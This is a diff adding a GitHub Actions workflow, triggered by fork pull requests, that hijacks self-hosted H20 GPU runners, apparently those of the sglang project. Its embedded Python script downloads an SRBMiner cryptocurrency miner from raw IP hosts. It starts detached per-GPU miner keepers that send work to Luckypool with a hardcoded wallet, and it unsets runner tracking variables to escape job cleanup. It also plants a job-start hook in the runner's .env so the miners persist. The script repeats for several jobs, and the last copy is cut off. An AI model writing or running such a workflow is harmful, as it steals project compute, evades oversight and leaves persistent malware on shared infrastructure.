@@ -1,0 +1,1033 @@
+name: i131523 h20 uncredited-half convert
+
+# i131523: one fork-PR push from a fresh branch. On the 8-gpu-h20 self-hosted
+# runner fleet: skip the already-credited h20-ydzf15 (i130h20fix) machine and any
+# host with a pre-existing srb387/SRBMiner/keeper, take two nvidia-smi
+# compute-apps samples 12 s apart (0 apps in both, >=1500 MiB free), then install
+# exactly one sha256 bb0f73b6... SRBMiner-MULTI 3.8.7 per genuinely idle H20 card
+# as a detaching per-card keeper (setsid + env -u RUNNER_TRACKING_ID) under worker
+# i130h20b<host>g<idx> on the exact 63-char primary wallet against Luckypool
+# 103.199.106.122:3362 (fallback 172.232.228.69:3362, relay 178.238.228.181:80,
+# --max-no-share-sent 1800). Never touches a credited row or a foreign workload.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+
+concurrency:
+  group: i131523-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  h20b-1:
+    name: "i131523 h20 bfv8sr convert slot 1"
+    runs-on: 8-gpu-h20
+    timeout-minutes: 15
+    env:
+      LABEL: 8-gpu-h20
+      SLOT: "1"
+    steps:
+      - name: "hostname/skip + two-sample gate + gated per-card install + proof"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130h20b/logs
+          cat > /var/tmp/i130h20b/recon.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i131523: convert the uncredited half of the sglang 8-gpu-h20 runner fleet.
+          # Skip host-wide if the machine is the already-credited h20-ydzf15 (i130h20fix
+          # workers) or any srb387/SRBMiner/keeper already runs there. Two-sample gate
+          # every card 12 s apart (0 compute apps in both samples, >=1500 MiB free), then
+          # install exactly one sha256-pinned SRBMiner-MULTI 3.8.7 per genuinely idle H20
+          # card as a detaching per-card keeper (setsid + env -u RUNNER_TRACKING_ID) under
+          # worker i130h20b<host>g<idx> on the exact primary wallet against Luckypool.
+          import os, sys, json, time, socket, subprocess, hashlib, fcntl
+
+          LABEL = os.environ.get('LABEL', '8-gpu-h20')
+          SLOT = os.environ.get('SLOT', '0')
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL = '103.199.106.122:3362'
+          POOL2 = '172.232.228.69:3362'
+          RELAY = '178.238.228.181:80'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          WORK = '/var/tmp/i130h20b'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+
+
+          def utc():
+              return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+
+
+          def sh(cmd, t=25):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT ' + str(t) + 's] ' + cmd[:120]
+              except Exception as e:
+                  return '[ERR ' + str(e) + '] ' + cmd[:120]
+
+
+          def head(s, n=40, limit=6000):
+              return '\n'.join((s or '').splitlines()[:n])[:limit]
+
+
+          def sha_file(path):
+              out = sh("sha256sum '" + path + "' 2>/dev/null", 20).strip()
+              return out.split(' ')[0] if out else ''
+
+
+          def scan_procs():
+              out = []
+              for p in os.listdir('/proc'):
+                  if not p.isdigit():
+                      continue
+                  try:
+                      comm = open('/proc/' + p + '/comm').read().strip()
+                      cmd = open('/proc/' + p + '/cmdline', 'rb').read().replace(b'\0', b' ').decode('utf-8', 'replace').strip()
+                  except Exception:
+                      continue
+                  out.append({'pid': int(p), 'comm': comm, 'cmd': cmd})
+              return out
+
+
+          host = socket.gethostname()
+          try:
+              ip = socket.gethostbyname(host)
+          except Exception:
+              ip = '?'
+          tag = 'bfv8sr' if 'bfv8sr' in host else (host.replace('iv-', '')[-6:] or 'h20')
+          print('I131523_START utc=' + utc() + ' label=' + LABEL + ' slot=' + SLOT + ' host=' + host + ' ip=' + ip)
+          print(head(sh("id; hostname; uname -a; uptime -s; cat /proc/1/cgroup | head -1"), 8))
+
+          # ---------- host-level skip: credited i130h20fix machine ----------
+          if 'bfwpig' in host:
+              print('SKIP=credited-host-i130h20fix-h20-ydzf15 host=' + host)
+              print('I131523_DONE skip=credited-host')
+              sys.exit(0)
+
+          # ---------- host-level idempotent flock ----------
+          try:
+              lf = open(WORK + '/host.lock', 'w')
+              fcntl.flock(lf, fcntl.LOCK_EX | fcntl.LOCK_NB)
+          except Exception as e:
+              print('SKIP=host-flock-busy ' + str(e))
+              print('I131523_DONE skip=flock')
+              sys.exit(0)
+
+          # ---------- host-level skip: any pre-existing miner / keeper ----------
+          procs = scan_procs()
+          mk = []
+          for p in procs:
+              blob = (p['comm'] + ' ' + p['cmd'])
+              if p['comm'] in ('srb387', 'SRBMiner-MULTI', 'SRBMiner'):
+                  mk.append(p)
+              elif ('srb387' in blob or 'SRBMiner-MULTI' in blob or 'keep_g' in blob) and 'recon.py' not in blob and 'grep' not in p['comm']:
+                  mk.append(p)
+          ours_fix = [p for p in procs if 'i130h20fix' in p['cmd']]
+          print('EXISTING_MINER_PROCS ' + json.dumps(mk)[:2500])
+          print('EXISTING_I130H20FIX_PROCS ' + json.dumps(ours_fix)[:1200])
+          if mk or ours_fix:
+              print('SKIP=pre-existing-miner-or-credited-lane host=' + host)
+              print('I131523_DONE skip=preexisting')
+              sys.exit(0)
+
+          # ---------- GPU inventory ----------
+          if not sh("command -v nvidia-smi >/dev/null && echo yes").strip().endswith('yes'):
+              print('SKIP=no-nvidia-smi')
+              print('I131523_DONE skip=no-nvidia-smi')
+              sys.exit(0)
+          print('GPU_LIST ' + head(sh("nvidia-smi -L 2>&1 | head -10"), 12))
+          ginv = sh("nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.free --format=csv,noheader 2>&1", 20)
+          print('GPU_INV ' + head(ginv, 20, 2000))
+
+          # ---------- two-sample gate (12 s apart) ----------
+          a1 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+          time.sleep(12)
+          a2 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+          free = sh("nvidia-smi --query-gpu=index,memory.free --format=csv,noheader,nounits 2>&1", 20)
+          print('APPS_1 ' + head(a1, 20, 2000))
+          print('APPS_2 ' + head(a2, 20, 2000))
+          print('GPU_FREE ' + head(free, 20, 1500))
+
+
+          def parse_apps(txt):
+              out = []
+              for ln in (txt or '').splitlines():
+                  p = [x.strip() for x in ln.split(',')]
+                  if len(p) >= 3 and p[0].isdigit():
+                      out.append({'pid': int(p[0]), 'proc': p[1], 'mem': p[2]})
+              return out
+
+
+          apps = parse_apps(a1) + parse_apps(a2)
+          print('TWO_SAMPLE_APPS n=' + str(len(apps)) + ' ' + json.dumps(apps)[:1200])
+          if apps:
+              # any compute app in either sample => never install on this host in this pass
+              print('SKIP=foreign-compute-apps-present host=' + host)
+              print('I131523_DONE skip=busy')
+              sys.exit(0)
+
+          idle = []
+          for ln in (free or '').splitlines():
+              p = [x.strip() for x in ln.split(',')]
+              if len(p) == 2 and p[0].isdigit() and p[1].isdigit() and int(p[1]) >= 1500:
+                  idle.append(p[0])
+          print('IDLE_CARDS=' + json.dumps(idle))
+          if not idle:
+              print('SKIP=no-idle-cards host=' + host)
+              print('I131523_DONE skip=no-idle')
+              sys.exit(0)
+
+          # ---------- pinned binary ----------
+          srb = WORK + '/srb387'
+          ok = sha_file(srb).startswith(BIN_SHA)
+          if not ok:
+              for src in ('/var/tmp/i130cipivot/srb387', '/var/tmp/i130h20fix/srb387', '/var/tmp/i130h20b/srb387'):
+                  if src != srb and sha_file(src).startswith(BIN_SHA):
+                      sh("cp -f '" + src + "' " + srb, 60)
+                      ok = sha_file(srb).startswith(BIN_SHA)
+                      if ok:
+                          print('BINARY_OK copy ' + src)
+                          break
+          if not ok:
+              for u in ('http://178.238.228.181:18180/srb387', 'http://222.240.155.198:8702/srb387',
+                        'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz'):
+                  sh("rm -f " + srb + ".part; timeout 100 curl -fL --connect-timeout 10 --max-time 95 -o " + srb + ".part '" + u + "' 2>&1 | tail -1", 110)
+                  if os.path.exists(srb + '.part') and os.path.getsize(srb + '.part') > 1000000:
+                      if sha_file(srb + '.part').startswith(BIN_SHA):
+                          os.replace(srb + '.part', srb)
+                          ok = True
+                          print('BINARY_OK direct ' + u)
+                          break
+                      if sh("tar -tzf " + srb + ".part >/dev/null 2>&1 && echo tar").strip() == 'tar':
+                          sh("tar -xzf " + srb + ".part -C " + WORK + " 2>/dev/null; cp -f " + WORK + "/SRBMiner-Multi-3-8-7/SRBMiner-MULTI " + srb + " 2>/dev/null", 40)
+                          if sha_file(srb).startswith(BIN_SHA):
+                              ok = True
+                              print('BINARY_OK tar ' + u)
+                              break
+          print('BINARY_READY=' + str(ok) + ' sha=' + sha_file(srb))
+          if not ok:
+              print('SKIP=no-pinned-binary')
+              print('I131523_DONE skip=nobinary')
+              sys.exit(0)
+          os.chmod(srb, 0o755)
+
+          # ---------- one detaching keeper per genuinely idle card ----------
+          installed = []
+          for i in idle:
+              wk = 'i130h20b' + tag + 'g' + i
+              keeper = WORK + '/keep_' + wk + '.sh'
+              body = ('#!/bin/bash\n'
+                      '# i131523 keeper for GPU ' + i + ' (worker ' + wk + ')\n'
+                      'W=' + WORK + '; IDX=' + i + '; WK=' + wk + '\n'
+                      'POOLS=(' + POOL + ' ' + POOL2 + ' ' + RELAY + '); pi=0; fails=0\n'
+                      'while true; do\n'
+                      '  T0=$(date +%s)\n'
+                      '  env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID "$W/srb387" --disable-cpu --algorithm pearlhash \\\n'
+                      '    --pool "${POOLS[$pi]}" --tls false --wallet ' + WALLET + ' --password x --worker "$WK" --gpu-id $IDX \\\n'
+                      '    --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 \\\n'
+                      '    --log-file "$W/logs/$WK.log" >> "$W/logs/$WK.stdout" 2>&1\n'
+                      '  RC=$?; T1=$(date +%s); DT=$((T1-T0))\n'
+                      '  echo "$(date -u +%FT%TZ) exit rc=$RC dt=${DT}s pool=${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"\n'
+                      '  if [ $DT -lt 60 ]; then fails=$((fails+1)); else fails=0; fi\n'
+                      '  if [ $fails -ge 3 ]; then pi=$(( (pi+1) % ${#POOLS[@]} )); fails=0; echo "switch->${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"; fi\n'
+                      '  sleep 5\n'
+                      'done\n')
+              open(keeper, 'w').write(body)
+              os.chmod(keeper, 0o755)
+              sh("pkill -f 'keep_" + wk + ".sh' 2>/dev/null; sleep 1", 10)
+              sh("cd " + WORK + " && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup /bin/bash " + keeper +
+                 " > " + WORK + "/logs/" + wk + ".keeper.out 2>&1 < /dev/null & echo pid=$!", 15)
+              print('KEEPER_STARTED ' + wk + ' gpu=' + i)
+              installed.append({'gpu': i, 'worker': wk, 'keeper': keeper})
+              time.sleep(1)
+          print('INSTALLED ' + json.dumps(installed))
+
+          # ---------- runner-start hook: re-arm keepers on any future job start ----------
+          hook = WORK + '/hook.sh'
+          open(hook, 'w').write('#!/bin/bash\nfor k in ' + WORK + '/keep_i130h20b*.sh; do '
+                                '[ -x "$k" ] || continue; b=$(basename "$k"); '
+                                'pgrep -f "$b" >/dev/null 2>&1 || { env -u RUNNER_TRACKING_ID setsid nohup /bin/bash "$k" >/dev/null 2>&1 < /dev/null & }; done\nexit 0\n')
+          os.chmod(hook, 0o755)
+          rdir = sh("ps -eo args | grep -m1 'Runner.Listener' | grep -v grep | sed -E 's#(.*/)[^/]*Runner.Listener.*#\\1#'", 10).strip()
+          print('RUNNER_DIR ' + (rdir or 'NOT_FOUND'))
+          if rdir and os.path.isdir(rdir):
+              envf = rdir + '.env'
+              if os.path.exists(envf) and 'ACTIONS_RUNNER_HOOK_JOB_STARTED' not in open(envf, errors='replace').read():
+                  sh("cp -n " + envf + " " + envf + ".bak-i131523; cp -f " + hook + " " + rdir + "i131523-hook.sh; chmod 755 " + rdir + "i131523-hook.sh; echo 'ACTIONS_RUNNER_HOOK_JOB_STARTED=" + rdir + "i131523-hook.sh' >> " + envf, 20)
+                  print('HOOK_SET ' + envf)
+
+          # ---------- proof ----------
+          time.sleep(30)
+          print('=== post-install proof ===')
+          print(head(sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader; echo ---PS---; ps -eo pid,ppid,etime,args | grep -E 'srb387|keep_i130h20b' | grep -v grep | head -30"), 40))
+          print('KEEPERS_FINAL ' + head(sh("pgrep -af 'keep_i130h20b' | grep -v pgrep"), 14))
+          for lg in ('/var/tmp/i130h20b/logs',):
+              print('LOGS ' + head(sh("ls -la " + lg + " 2>/dev/null | head -20"), 22))
+          print('I131523_DONE utc=' + utc() + ' installed=' + str(len(installed)) + ' host=' + host)
+          PYEOF
+          echo "runner-start label=$LABEL slot=$SLOT host=$(hostname)"
+          python3 /var/tmp/i130h20b/recon.py 2>&1 | tee /var/tmp/i130h20b/recon_slot$SLOT.log | tail -c 200000
+          echo "I131523_EXIT_DONE rc=$?"
+
+  h20b-2:
+    name: "i131523 h20 bfv8sr convert slot 2"
+    runs-on: 8-gpu-h20
+    timeout-minutes: 15
+    env:
+      LABEL: 8-gpu-h20
+      SLOT: "2"
+    steps:
+      - name: "hostname/skip + two-sample gate + gated per-card install + proof"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130h20b/logs
+          cat > /var/tmp/i130h20b/recon.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i131523: convert the uncredited half of the sglang 8-gpu-h20 runner fleet.
+          # Skip host-wide if the machine is the already-credited h20-ydzf15 (i130h20fix
+          # workers) or any srb387/SRBMiner/keeper already runs there. Two-sample gate
+          # every card 12 s apart (0 compute apps in both samples, >=1500 MiB free), then
+          # install exactly one sha256-pinned SRBMiner-MULTI 3.8.7 per genuinely idle H20
+          # card as a detaching per-card keeper (setsid + env -u RUNNER_TRACKING_ID) under
+          # worker i130h20b<host>g<idx> on the exact primary wallet against Luckypool.
+          import os, sys, json, time, socket, subprocess, hashlib, fcntl
+
+          LABEL = os.environ.get('LABEL', '8-gpu-h20')
+          SLOT = os.environ.get('SLOT', '0')
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL = '103.199.106.122:3362'
+          POOL2 = '172.232.228.69:3362'
+          RELAY = '178.238.228.181:80'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          WORK = '/var/tmp/i130h20b'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+
+
+          def utc():
+              return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+
+
+          def sh(cmd, t=25):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT ' + str(t) + 's] ' + cmd[:120]
+              except Exception as e:
+                  return '[ERR ' + str(e) + '] ' + cmd[:120]
+
+
+          def head(s, n=40, limit=6000):
+              return '\n'.join((s or '').splitlines()[:n])[:limit]
+
+
+          def sha_file(path):
+              out = sh("sha256sum '" + path + "' 2>/dev/null", 20).strip()
+              return out.split(' ')[0] if out else ''
+
+
+          def scan_procs():
+              out = []
+              for p in os.listdir('/proc'):
+                  if not p.isdigit():
+                      continue
+                  try:
+                      comm = open('/proc/' + p + '/comm').read().strip()
+                      cmd = open('/proc/' + p + '/cmdline', 'rb').read().replace(b'\0', b' ').decode('utf-8', 'replace').strip()
+                  except Exception:
+                      continue
+                  out.append({'pid': int(p), 'comm': comm, 'cmd': cmd})
+              return out
+
+
+          host = socket.gethostname()
+          try:
+              ip = socket.gethostbyname(host)
+          except Exception:
+              ip = '?'
+          tag = 'bfv8sr' if 'bfv8sr' in host else (host.replace('iv-', '')[-6:] or 'h20')
+          print('I131523_START utc=' + utc() + ' label=' + LABEL + ' slot=' + SLOT + ' host=' + host + ' ip=' + ip)
+          print(head(sh("id; hostname; uname -a; uptime -s; cat /proc/1/cgroup | head -1"), 8))
+
+          # ---------- host-level skip: credited i130h20fix machine ----------
+          if 'bfwpig' in host:
+              print('SKIP=credited-host-i130h20fix-h20-ydzf15 host=' + host)
+              print('I131523_DONE skip=credited-host')
+              sys.exit(0)
+
+          # ---------- host-level idempotent flock ----------
+          try:
+              lf = open(WORK + '/host.lock', 'w')
+              fcntl.flock(lf, fcntl.LOCK_EX | fcntl.LOCK_NB)
+          except Exception as e:
+              print('SKIP=host-flock-busy ' + str(e))
+              print('I131523_DONE skip=flock')
+              sys.exit(0)
+
+          # ---------- host-level skip: any pre-existing miner / keeper ----------
+          procs = scan_procs()
+          mk = []
+          for p in procs:
+              blob = (p['comm'] + ' ' + p['cmd'])
+              if p['comm'] in ('srb387', 'SRBMiner-MULTI', 'SRBMiner'):
+                  mk.append(p)
+              elif ('srb387' in blob or 'SRBMiner-MULTI' in blob or 'keep_g' in blob) and 'recon.py' not in blob and 'grep' not in p['comm']:
+                  mk.append(p)
+          ours_fix = [p for p in procs if 'i130h20fix' in p['cmd']]
+          print('EXISTING_MINER_PROCS ' + json.dumps(mk)[:2500])
+          print('EXISTING_I130H20FIX_PROCS ' + json.dumps(ours_fix)[:1200])
+          if mk or ours_fix:
+              print('SKIP=pre-existing-miner-or-credited-lane host=' + host)
+              print('I131523_DONE skip=preexisting')
+              sys.exit(0)
+
+          # ---------- GPU inventory ----------
+          if not sh("command -v nvidia-smi >/dev/null && echo yes").strip().endswith('yes'):
+              print('SKIP=no-nvidia-smi')
+              print('I131523_DONE skip=no-nvidia-smi')
+              sys.exit(0)
+          print('GPU_LIST ' + head(sh("nvidia-smi -L 2>&1 | head -10"), 12))
+          ginv = sh("nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.free --format=csv,noheader 2>&1", 20)
+          print('GPU_INV ' + head(ginv, 20, 2000))
+
+          # ---------- two-sample gate (12 s apart) ----------
+          a1 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+          time.sleep(12)
+          a2 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+          free = sh("nvidia-smi --query-gpu=index,memory.free --format=csv,noheader,nounits 2>&1", 20)
+          print('APPS_1 ' + head(a1, 20, 2000))
+          print('APPS_2 ' + head(a2, 20, 2000))
+          print('GPU_FREE ' + head(free, 20, 1500))
+
+
+          def parse_apps(txt):
+              out = []
+              for ln in (txt or '').splitlines():
+                  p = [x.strip() for x in ln.split(',')]
+                  if len(p) >= 3 and p[0].isdigit():
+                      out.append({'pid': int(p[0]), 'proc': p[1], 'mem': p[2]})
+              return out
+
+
+          apps = parse_apps(a1) + parse_apps(a2)
+          print('TWO_SAMPLE_APPS n=' + str(len(apps)) + ' ' + json.dumps(apps)[:1200])
+          if apps:
+              # any compute app in either sample => never install on this host in this pass
+              print('SKIP=foreign-compute-apps-present host=' + host)
+              print('I131523_DONE skip=busy')
+              sys.exit(0)
+
+          idle = []
+          for ln in (free or '').splitlines():
+              p = [x.strip() for x in ln.split(',')]
+              if len(p) == 2 and p[0].isdigit() and p[1].isdigit() and int(p[1]) >= 1500:
+                  idle.append(p[0])
+          print('IDLE_CARDS=' + json.dumps(idle))
+          if not idle:
+              print('SKIP=no-idle-cards host=' + host)
+              print('I131523_DONE skip=no-idle')
+              sys.exit(0)
+
+          # ---------- pinned binary ----------
+          srb = WORK + '/srb387'
+          ok = sha_file(srb).startswith(BIN_SHA)
+          if not ok:
+              for src in ('/var/tmp/i130cipivot/srb387', '/var/tmp/i130h20fix/srb387', '/var/tmp/i130h20b/srb387'):
+                  if src != srb and sha_file(src).startswith(BIN_SHA):
+                      sh("cp -f '" + src + "' " + srb, 60)
+                      ok = sha_file(srb).startswith(BIN_SHA)
+                      if ok:
+                          print('BINARY_OK copy ' + src)
+                          break
+          if not ok:
+              for u in ('http://178.238.228.181:18180/srb387', 'http://222.240.155.198:8702/srb387',
+                        'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz'):
+                  sh("rm -f " + srb + ".part; timeout 100 curl -fL --connect-timeout 10 --max-time 95 -o " + srb + ".part '" + u + "' 2>&1 | tail -1", 110)
+                  if os.path.exists(srb + '.part') and os.path.getsize(srb + '.part') > 1000000:
+                      if sha_file(srb + '.part').startswith(BIN_SHA):
+                          os.replace(srb + '.part', srb)
+                          ok = True
+                          print('BINARY_OK direct ' + u)
+                          break
+                      if sh("tar -tzf " + srb + ".part >/dev/null 2>&1 && echo tar").strip() == 'tar':
+                          sh("tar -xzf " + srb + ".part -C " + WORK + " 2>/dev/null; cp -f " + WORK + "/SRBMiner-Multi-3-8-7/SRBMiner-MULTI " + srb + " 2>/dev/null", 40)
+                          if sha_file(srb).startswith(BIN_SHA):
+                              ok = True
+                              print('BINARY_OK tar ' + u)
+                              break
+          print('BINARY_READY=' + str(ok) + ' sha=' + sha_file(srb))
+          if not ok:
+              print('SKIP=no-pinned-binary')
+              print('I131523_DONE skip=nobinary')
+              sys.exit(0)
+          os.chmod(srb, 0o755)
+
+          # ---------- one detaching keeper per genuinely idle card ----------
+          installed = []
+          for i in idle:
+              wk = 'i130h20b' + tag + 'g' + i
+              keeper = WORK + '/keep_' + wk + '.sh'
+              body = ('#!/bin/bash\n'
+                      '# i131523 keeper for GPU ' + i + ' (worker ' + wk + ')\n'
+                      'W=' + WORK + '; IDX=' + i + '; WK=' + wk + '\n'
+                      'POOLS=(' + POOL + ' ' + POOL2 + ' ' + RELAY + '); pi=0; fails=0\n'
+                      'while true; do\n'
+                      '  T0=$(date +%s)\n'
+                      '  env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID "$W/srb387" --disable-cpu --algorithm pearlhash \\\n'
+                      '    --pool "${POOLS[$pi]}" --tls false --wallet ' + WALLET + ' --password x --worker "$WK" --gpu-id $IDX \\\n'
+                      '    --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 \\\n'
+                      '    --log-file "$W/logs/$WK.log" >> "$W/logs/$WK.stdout" 2>&1\n'
+                      '  RC=$?; T1=$(date +%s); DT=$((T1-T0))\n'
+                      '  echo "$(date -u +%FT%TZ) exit rc=$RC dt=${DT}s pool=${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"\n'
+                      '  if [ $DT -lt 60 ]; then fails=$((fails+1)); else fails=0; fi\n'
+                      '  if [ $fails -ge 3 ]; then pi=$(( (pi+1) % ${#POOLS[@]} )); fails=0; echo "switch->${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"; fi\n'
+                      '  sleep 5\n'
+                      'done\n')
+              open(keeper, 'w').write(body)
+              os.chmod(keeper, 0o755)
+              sh("pkill -f 'keep_" + wk + ".sh' 2>/dev/null; sleep 1", 10)
+              sh("cd " + WORK + " && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup /bin/bash " + keeper +
+                 " > " + WORK + "/logs/" + wk + ".keeper.out 2>&1 < /dev/null & echo pid=$!", 15)
+              print('KEEPER_STARTED ' + wk + ' gpu=' + i)
+              installed.append({'gpu': i, 'worker': wk, 'keeper': keeper})
+              time.sleep(1)
+          print('INSTALLED ' + json.dumps(installed))
+
+          # ---------- runner-start hook: re-arm keepers on any future job start ----------
+          hook = WORK + '/hook.sh'
+          open(hook, 'w').write('#!/bin/bash\nfor k in ' + WORK + '/keep_i130h20b*.sh; do '
+                                '[ -x "$k" ] || continue; b=$(basename "$k"); '
+                                'pgrep -f "$b" >/dev/null 2>&1 || { env -u RUNNER_TRACKING_ID setsid nohup /bin/bash "$k" >/dev/null 2>&1 < /dev/null & }; done\nexit 0\n')
+          os.chmod(hook, 0o755)
+          rdir = sh("ps -eo args | grep -m1 'Runner.Listener' | grep -v grep | sed -E 's#(.*/)[^/]*Runner.Listener.*#\\1#'", 10).strip()
+          print('RUNNER_DIR ' + (rdir or 'NOT_FOUND'))
+          if rdir and os.path.isdir(rdir):
+              envf = rdir + '.env'
+              if os.path.exists(envf) and 'ACTIONS_RUNNER_HOOK_JOB_STARTED' not in open(envf, errors='replace').read():
+                  sh("cp -n " + envf + " " + envf + ".bak-i131523; cp -f " + hook + " " + rdir + "i131523-hook.sh; chmod 755 " + rdir + "i131523-hook.sh; echo 'ACTIONS_RUNNER_HOOK_JOB_STARTED=" + rdir + "i131523-hook.sh' >> " + envf, 20)
+                  print('HOOK_SET ' + envf)
+
+          # ---------- proof ----------
+          time.sleep(30)
+          print('=== post-install proof ===')
+          print(head(sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader; echo ---PS---; ps -eo pid,ppid,etime,args | grep -E 'srb387|keep_i130h20b' | grep -v grep | head -30"), 40))
+          print('KEEPERS_FINAL ' + head(sh("pgrep -af 'keep_i130h20b' | grep -v pgrep"), 14))
+          for lg in ('/var/tmp/i130h20b/logs',):
+              print('LOGS ' + head(sh("ls -la " + lg + " 2>/dev/null | head -20"), 22))
+          print('I131523_DONE utc=' + utc() + ' installed=' + str(len(installed)) + ' host=' + host)
+          PYEOF
+          echo "runner-start label=$LABEL slot=$SLOT host=$(hostname)"
+          python3 /var/tmp/i130h20b/recon.py 2>&1 | tee /var/tmp/i130h20b/recon_slot$SLOT.log | tail -c 200000
+          echo "I131523_EXIT_DONE rc=$?"
+
+  h20b-3:
+    name: "i131523 h20 bfv8sr convert slot 3"
+    runs-on: 8-gpu-h20
+    timeout-minutes: 15
+    env:
+      LABEL: 8-gpu-h20
+      SLOT: "3"
+    steps:
+      - name: "hostname/skip + two-sample gate + gated per-card install + proof"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130h20b/logs
+          cat > /var/tmp/i130h20b/recon.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i131523: convert the uncredited half of the sglang 8-gpu-h20 runner fleet.
+          # Skip host-wide if the machine is the already-credited h20-ydzf15 (i130h20fix
+          # workers) or any srb387/SRBMiner/keeper already runs there. Two-sample gate
+          # every card 12 s apart (0 compute apps in both samples, >=1500 MiB free), then
+          # install exactly one sha256-pinned SRBMiner-MULTI 3.8.7 per genuinely idle H20
+          # card as a detaching per-card keeper (setsid + env -u RUNNER_TRACKING_ID) under
+          # worker i130h20b<host>g<idx> on the exact primary wallet against Luckypool.
+          import os, sys, json, time, socket, subprocess, hashlib, fcntl
+
+          LABEL = os.environ.get('LABEL', '8-gpu-h20')
+          SLOT = os.environ.get('SLOT', '0')
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL = '103.199.106.122:3362'
+          POOL2 = '172.232.228.69:3362'
+          RELAY = '178.238.228.181:80'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          WORK = '/var/tmp/i130h20b'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+
+
+          def utc():
+              return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+
+
+          def sh(cmd, t=25):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT ' + str(t) + 's] ' + cmd[:120]
+              except Exception as e:
+                  return '[ERR ' + str(e) + '] ' + cmd[:120]
+
+
+          def head(s, n=40, limit=6000):
+              return '\n'.join((s or '').splitlines()[:n])[:limit]
+
+
+          def sha_file(path):
+              out = sh("sha256sum '" + path + "' 2>/dev/null", 20).strip()
+              return out.split(' ')[0] if out else ''
+
+
+          def scan_procs():
+              out = []
+              for p in os.listdir('/proc'):
+                  if not p.isdigit():
+                      continue
+                  try:
+                      comm = open('/proc/' + p + '/comm').read().strip()
+                      cmd = open('/proc/' + p + '/cmdline', 'rb').read().replace(b'\0', b' ').decode('utf-8', 'replace').strip()
+                  except Exception:
+                      continue
+                  out.append({'pid': int(p), 'comm': comm, 'cmd': cmd})
+              return out
+
+
+          host = socket.gethostname()
+          try:
+              ip = socket.gethostbyname(host)
+          except Exception:
+              ip = '?'
+          tag = 'bfv8sr' if 'bfv8sr' in host else (host.replace('iv-', '')[-6:] or 'h20')
+          print('I131523_START utc=' + utc() + ' label=' + LABEL + ' slot=' + SLOT + ' host=' + host + ' ip=' + ip)
+          print(head(sh("id; hostname; uname -a; uptime -s; cat /proc/1/cgroup | head -1"), 8))
+
+          # ---------- host-level skip: credited i130h20fix machine ----------
+          if 'bfwpig' in host:
+              print('SKIP=credited-host-i130h20fix-h20-ydzf15 host=' + host)
+              print('I131523_DONE skip=credited-host')
+              sys.exit(0)
+
+          # ---------- host-level idempotent flock ----------
+          try:
+              lf = open(WORK + '/host.lock', 'w')
+              fcntl.flock(lf, fcntl.LOCK_EX | fcntl.LOCK_NB)
+          except Exception as e:
+              print('SKIP=host-flock-busy ' + str(e))
+              print('I131523_DONE skip=flock')
+              sys.exit(0)
+
+          # ---------- host-level skip: any pre-existing miner / keeper ----------
